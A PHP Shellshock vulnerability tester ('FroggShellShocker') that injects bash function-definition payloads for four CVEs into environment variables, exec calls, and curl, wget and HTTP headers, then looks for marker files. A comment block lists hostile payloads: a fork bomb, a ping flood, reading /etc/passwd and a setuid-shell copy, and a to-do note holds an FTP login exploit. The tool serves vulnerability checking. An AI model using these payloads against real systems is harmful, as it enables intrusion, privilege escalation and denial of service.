<?
//            _ __ _     
//        ((-)).--.((-))
//        /     ''     \  
//       (   \______/   )           
//        \    (  )    / 
//        / /~~~~~~~~\ \
//   /~~\/ /          \ \/~~\
//  (   ( (            ) )   )
//   \ \ \ \          / / / /
//   _\ \/  \.______./  \/ /_
//   ___/ /\__________/\ \___
//  *************************************
//  * FroggShellShocker V 1.000         *
//  * --------------------------------- *
//  * Check ShellShock Vulnerability    *
//  * Powered by: Frogg                 *
//  * Email     : admin@frogg.fr        *
//  * Warning   : Do Not Feed The Frogg *
//  *************************************

//ShellShock Article description
//http://linuxfr.org/news/une-faille-nommee-shellshock

//Possible Exploit:
/*
- /bin/sh is pointing on /bin/bash ;
- if SELinux disabled or not configured ;
- OpenSSH servers that use the ForceCommand capability ;
- Apache HTTP Servers that use CGI scripts (via mod_cgi and mod_cgid) that are written in Bash or launch to Bash subshell ;
- network services who will execute bash ;
*/

/******** =====[ @WORK ]==== ************
TODOLIST:
- Make more test
- Set dynamic Url
- Change code to be order in class (set exploit code as array to be better use in code)
- Dynamically create test folder
- Add more daemon test
	* CGI
	* DHCP
	* OpenSSH
	* SELinux
	* .htaccess
	* Apache Conf
*******************************************/

/*=============SCRIPT CONFIG==============*/
/*    /!\ CONFIG PART IS IMPORTANT /!\    */
/*========================================*/
//Script info for PHP CURL
$serverOriIp="127.0.0.1";			// ip used for http request hack
$serverProt	="http";				// server protocol (http/https)
$httpConnect=array();				// ( nothing to do here )
//Http login, uncomment if needed, then set http login infos
	//$httpConnect['log']='admin';
	//$httpConnect['pas']='test';
$fileName	= "ShellShockExploit";	//name of the file wrote on the server if exploit worked
$fileExt	= "vulnerable";			//extension of the file wrote on the server if exploit worked
$filePath	= "/tmp/exploit/";		//path where the file will be wrote on the server if exploit worked need to start from / (root) ex: /var/www
									//;the best way is to create a specific folder like /tmp/exploit/ with www user rights 
									//console command: mkdir -p /tmp/exploit && chown www-data:www-data /tmp/exploit && chmod 777 /tmp/exploit
									//when the tests are done, you can remove this folder
									//dont forget the / at then end of the path!
$lvl		= 0;					//lvl of test can be 0 to 3 atm...can be changed manually or from select box in html display
/*									case 0: CVE-2014-6271 vulnerability
									case 1: CVE-2014-7169 vulnerability 
									case 2: CVE-2014-7186 vulnerability 
									case 3: CVE-2014-7187 vulnerability 
*/	
// ( nothing to do here )
$fullName	= $filePath.$fileName;				// ( nothing to do here )
$serverIp	= $serverProt."://".$serverOriIp;	// ( nothing to do here )
if(isSet($_GET['lvl'])){$lvl=$_GET['lvl'];} 	// ( nothing to do here ) set lvl param if passed from url
/*========================================*/

/******************************************
 * ---------- [ ATTACK FUNC ] ----------- *
 ******************************************/

//========Exploit function String maker=======
//exploit 0 "() { (a)=>\' bash -c 'COMMAND'"
//exploit 1 "() { :;};COMMAND"

//Exploit kind, depending of $lvl
function strFullCmd($cmd,$lvl)
{
$str="";
switch($lvl)
	{
	//CVE-2014-6271 vulnerability
	case 0	: $str="() { :;}; $cmd";break;
	//CVE-2014-7169 vulnerability 
	case 1	: $str="() { (a)=>\' bash -c '$cmd'";break;
	//CVE-2014-7186 vulnerability 
	case 2	: $str="bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || $cmd";break;
	//CVE-2014-7187 vulnerability 
	case 3	: $str="(for x in {1..200} ; do echo \"for x$x in ; do :\"; done; for x in {1..200} ; do echo done ; done) | bash || $cmd";break;
	//case not defined...stop script
	default	: die("lvl passed is undefined...");break;
	}
return $str;
}

//Command here is [ touch +filename ] can be change for any other func
function strCmd($test)
	{
	global $fullName;
	global $fileExt;
	return "touch $fullName.$test.$fileExt";
	}

/*
==Other Command example==
* [ Bomb script ]
() { :; }; :(){ :|: & };:
* [ DDos script ]
() { :; }; ping -s 1000000 <victim IP>
* [ Get comp logins ]
() { :; }; /bin/cat /etc/passwd
* [ Setuid shell ]
() { :; }; cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash

or send an infite loop
for (( ;; )) do echo tmp; done
*/

/******************************************
 * ------ [ CLEAN OLD FUNC RESULT ] ----- *
 ******************************************/
if(function_exists('exec')){exec("rm $filePath$fileName*$fileExt");}					//using exec
else if(function_exists('shell_exec')){shell_exec("rm $filePath$fileName*$fileExt");}	//else using shellexec
else{array_map('unlink', glob("$filePath$fileName*$fileExt"));}						//else using php
 
/******************************************
 * ------ [ HTML LVL CHOICE FUNC ] ------ *
 ******************************************/

//Html Option part 
echo "Choose the vulnerability test : <select id=\"lvl\">";
echo "<option value=\"0\" ".($lvl=="0"?"selected":"").">Test CVE-2014-6271 vulnerability</option>";
echo "<option value=\"1\" ".($lvl=="1"?"selected":"").">Test CVE-2014-7169 vulnerability</option>";
echo "<option value=\"2\" ".($lvl=="2"?"selected":"").">Test CVE-2014-7186 vulnerability</option>";
echo "<option value=\"3\" ".($lvl=="3"?"selected":"").">Test CVE-2014-7187 vulnerability</option>";
echo "</select><br><br>\n";

//Javascript Event part
echo "<script>\ndocument.getElementById('lvl').onchange=function(){\ndocument.location='?lvl='+this.value;\n};\n</script>";

	
/******************************************
 * --------- [ PHP COMMON FUNC ] -------- *
 ******************************************/

//===========> global TEST [NOT AFFECTED : php compilation error]
//echo "<H1>SHELL SHOCK EXPLOIT TEST (php command global)</H1>";
//global "() { :;};touch $fullName.phpGlobal.$fileExt"; 
 
//===========> DEFINE TEST [NOT AFFECTED]
echo '<H1>SHELL SHOCK EXPLOIT TEST (php command define)</H1>';
define("_var_", strFullCmd(strCmd('phpDefine'),$lvl));
echo "define test = "._var_."<br>";

//===========> $_ENV TEST [NOT AFFECTED]
echo '<H1>SHELL SHOCK EXPLOIT TEST (php command $_ENV)</H1>';
$_ENV["var"]=strFullCmd(strCmd('phpEnv'),$lvl);
echo '$_ENV test = '.$_ENV["var"];

//===========> putenv TEST [NOT AFFECTED]
if(function_exists('putenv'))
	{
	echo '<H1>SHELL SHOCK EXPLOIT TEST (php command putenv)</H1>';
	putenv( "var=".strFullCmd(strCmd('phpPutEnv'),$lvl) );
	echo "putenv test = ".getenv("var");
	}

//===========> apache_setenv TEST [NOT AFFECTED]
if(function_exists('apache_setenv'))
	{
	echo "<H1>SHELL SHOCK EXPLOIT TEST (php command apache_setenv)</H1>";
	apache_setenv("var",strFullCmd(strCmd('phpApacheSetEnv'),$lvl));
	echo "apache_setenv() test = ".$_SERVER["var"];
	}

//===========> exec() TEST [AFFECTED]
if(function_exists('exec'))
	{
	echo '<h1>SHELL SHOCK EXPLOIT TEST (php exec + shell curl + shell wget)</h1>';
	exec("env var='".strFullCmd(strCmd('phpExec'),$lvl)."' /bin/bash -c /bin/true");
	exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl).' '.$serverIp);
	exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl).' '.$serverIp);
	echo "exec() test = ".$_ENV["var"];
	}
else{echo "php exec isnot activated on this server<br>";}

//===========> shell_exec() TEST [AFFECTED]
if(function_exists('shell_exec'))
	{
	echo '<h1>SHELL SHOCK EXPLOIT TEST (php shell_exec + shell curl + shell wget)</h1>';
	shell_exec("env var='".strFullCmd(strCmd('phpShellExec'),$lvl)."' /bin/bash -c /bin/true");
	shell_exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl).' '.$serverIp);
	shell_exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl).' '.$serverIp);
	echo "shell_exec() test = ".$_ENV["var"];
	}
else{echo "php shell_exec isnot activated on this server<br>";}

/******************************************
 * ---------- [ PHP CURL FUNC ] --------- *
 ******************************************/	
if(function_exists('curl_exec'))
	{
	echo '<h1>SHELL SHOCK EXPLOIT TEST (php headers using curl)</h1>';
	$frogg	= curl_init();
	curl_setopt($frogg,CURLOPT_URL,$serverOriIp);
	curl_setopt($frogg,CURLOPT_HEADER,true);					
	curl_setopt($frogg,CURLOPT_TIMEOUT,15);
	curl_setopt($frogg,CURLOPT_MAXREDIRS,10);
	curl_setopt($frogg,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($frogg,CURLOPT_FOLLOWLOCATION,true);
	curl_setopt($frogg,CURLOPT_HTTPHEADER,array('Expect:')); 	
	curl_setopt($frogg,CURLOPT_COOKIE, 	 "var=".strFullCmd(strCmd('phpCurl.1'),$lvl));
	curl_setopt($frogg,CURLOPT_USERAGENT,"var=".strFullCmd(strCmd('phpCurl.2'),$lvl));
    curl_setopt($frogg,CURLOPT_REFERER,  "var=".strFullCmd(strCmd('phpCurl.3'),$lvl));
	//curl_setopt($frogg,CURLOPT_USERAGENT,"Frogg ShellShockExploitTester");
	//Local server infos if requier http login
	if(!empty($httpConnect)){curl_setopt($frogg,CURLOPT_USERPWD,$httpConnect['log'].':'.$httpConnect['pas']);}
	//Execute curl
	curl_exec($frogg);
	//Curl result
	echo "CURL HTTPCODE RESULT = ".curl_getinfo($frogg,CURLINFO_HTTP_CODE)."<br>";
	}
else{echo "php curl_exec isnot activated on this server<br>";}

/*****************************************
 * --------- [ PHP WGET FUNC ] --------- *
 *****************************************/	
if(function_exists('file_get_contents'))
	{
	echo '<h1>SHELL SHOCK EXPLOIT TEST (php headers using file_get_contents)</h1>';
	$opts = array(
				'http'=>array(
					'method'	=> "GET",
					'header'	=> "Accept-language: en\r\nCookie: var=".strFullCmd(strCmd('phpWget.1'),$lvl)."\r\n",
					'useragent'	=> "var=".strFullCmd(strCmd('phpWget.2'),$lvl), 
					'referer'	=> "var=".strFullCmd(strCmd('phpWget.3'),$lvl)		
					)
				);
	$context = stream_context_create($opts);
	$file = file_get_contents($serverIp, false, $context);
	
	foreach($http_response_header as $r){echo "$r<br>";}
	}
else{echo "php file_get_contents isnot activated on this server<br>";}

/******************************************
 * ------- [ PHP PROC_OPEN FUNC ] ------- *
 ******************************************/	
if(function_exists('proc_open'))
	{
	echo '<h1>SHELL SHOCK EXPLOIT TEST (php proc_open)</h1>';
	
	
	
	
	
	$env=array	(	
					//'test0' => '() { :;}; echo "<font color=red>THIS SHELL IS VULNERABLE</font>"',
					'test0' => strFullCmd('echo "<font color=red>THIS SHELL IS VULNERABLE</font>"',$lvl),
					'var' => strFullCmd(strCmd('proc_open'),$lvl),
					/*
					'test1' => '() { :;}; touch remtest.AAA',
					'test2' => '() { :;}; echo "$(pwd)',
					'test3' => '() { :;}; echo "$(whoami)',
					'test4' => '() { :;}; echo "$(id -u -n)',
					'test5' => '() { :;}; echo "$(USER)',
					*/
				);
	$des=array	(
				0 => array('pipe','r'),
				1 => array('pipe','w'),
				2 => array('pipe','w'),
				);	
	$tst=proc_open('/bin/bash -c /bin/true',$des,$pipes,null,$env);
	
	//to test for 2nd check
	//$p = proc_open("rm -f echo; env 'x=() { (a)=>\' bash -c \"echo date +%Y\"; cat echo", $desc, $pipes, sys_get_temp_dir());
	
	//echo "proc_open test = ".stream_get_contents($pipes[0])."<br>";
	echo "proc_open test = ".stream_get_contents($pipes[1])."<br>";
	echo "proc_open test = ".stream_get_contents($pipes[2])."<br>";
	proc_close($tst);
	}
 
 
/*****************************************
 * ----- [ PHP SHELLSHOCK RESULT ] ----- *
 *****************************************/	
//===========> RESULT
if(function_exists('exec'))
	{
	echo "<h1><font color=red>[ SHELLSHOCK EXPLOIT  RESULT ]</font></h1>";	
	$res=exec('find / -name "'.$fileName.'*" -type f -print0');
	$t=explode($fileExt,$res);
	if(count($t)>1)
		{
		echo "<b><font color=red>this is the list of file created from shellshock exploit :</font></b><br>";	
		foreach($t as $v){if(trim($v)!='')echo "- ".$v.$fileExt."<br>";}
		}
	else{echo "<b><font color=green>Your server is secured against selected shellshock exploit</font></b><br>";}
	}
else if(function_exists('shell_exec'))
	{
	echo "<h1><font color=red>[ SHELLSHOCK EXPLOIT RESULT ]</font></h1>";
	$t=explode("\n",shell_exec('find / -name "'.$fileName.'*" -type f'));
	if(count($t)>1)
		{
		echo "<b><font color=red>this is the list of file created from shellshock exploit :</font></b><br>";	
		foreach($t as $v){if(trim($v)!='')echo "- ".$v."<br>";}
		}
	else{echo "<b><font color=green>Your server is secured against selected shellshock exploit</font></b><br>";}
	}
else{echo "server has too much php securities: results cannot be shown, you have to run manually the command 'find / -name \"$fullName\" -type f' in console ";}

//===========> CLEANING ENV
if(function_exists('exec')){exec("unset var");}
else if(function_exists('shell_exec')){shell_exec("unset var");}


/*SOME CODE FOR MANUAL TEST, NOT USED ATM */
/*WILL BE USE FOR FURTHER TEST...         */
/*----------------------------------------*/
//Test From Apache conf [NOT TESTED]
//<VirtualHost hostname:80>
   //SetEnv var "'() { :;};touch ShellShockExploit.vulnerable' /bin/bash -c /bin/true"
//</VirtualHost>

//Test From .htaccess [NOT TESTED]
//SetEnv var "'() { :;};touch ShellShockExploit.vulnerable' /bin/bash -c /bin/true"

//Test From bash [AFFEDTED]
//env var='() { :;};touch ShellShockExploit.vulnerable' /bin/bash -c /bin/true


/*

todo add pure FTP exploit check ==>

$ cat > /tmp/handler.sh
#! /bin/bash
echo auth_ok:1
echo uid:42
echo gid:21
echo dir:/tmp
echo end
^D
 
$ chmod +x /tmp/handler.sh
 
# pure-authd -B -s /tmp/ftpd.sock -r /tmp/handler.sh
 
# pure-ftpd -B -l extauth:/tmp/ftpd.sock
 
$ ftp 127.0.0.1
Name: () { :; }; touch /tmp/pwnd
Password: whatever
^C
 
$ ls -l /tmp/pwnd
-rw-------  1 root  wheel  0 Sep 27 15:28 /tmp/pwnd


+ add all from
https://github.com/mubix/shellshocker-pocs

*/


/*----------------------------------------*/
?>
